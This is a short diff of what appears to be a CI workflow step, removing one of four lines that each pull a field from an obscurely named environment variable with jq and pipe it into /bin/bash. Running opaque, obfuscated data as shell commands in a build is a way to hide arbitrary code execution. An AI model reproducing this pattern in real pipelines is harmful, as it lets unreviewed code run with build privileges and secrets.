@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$tlycg74015" | jq -r .zu5 | /bin/bash
           echo $abb92 | jq -r .pe8343 | /bin/bash
-          printf '%s' "$lfj2" | jq -r .mdx0 | /bin/bash
           printf '%s' "$aj062" | jq -r .vl54 | /bin/bash
 
       - name: Store results
